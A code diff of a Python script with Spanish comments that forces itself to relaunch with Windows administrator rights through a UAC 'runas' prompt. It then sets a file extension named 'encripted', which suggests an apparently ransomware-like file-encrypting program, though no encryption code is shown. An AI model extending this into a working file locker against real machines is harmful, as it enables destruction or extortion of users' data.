@@ -7,20 +7,19 @@ import ctypes
 if input("Do you want to do this? (y/n)")!="y":
     print(2/0)
 
-def es_admin():
+def run_as_admin():
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
+        # Solicita permisos de administrador
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    except Exception as e:
+        print(f"Error al solicitar permisos de administrador: {e}")
+        sys.exit(1)
 
-if es_admin():
-    # Código que se ejecutará con privilegios de administrador
+if ctypes.windll.shell32.IsUserAnAdmin():
     pass
 else:
-    # Re-ejecuta el programa con privilegios de administrador
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-
-
+    print("Este programa requiere permisos de administrador. Solicitando elevación...")
+    run_as_admin()
 
 
 extension = 'encripted'
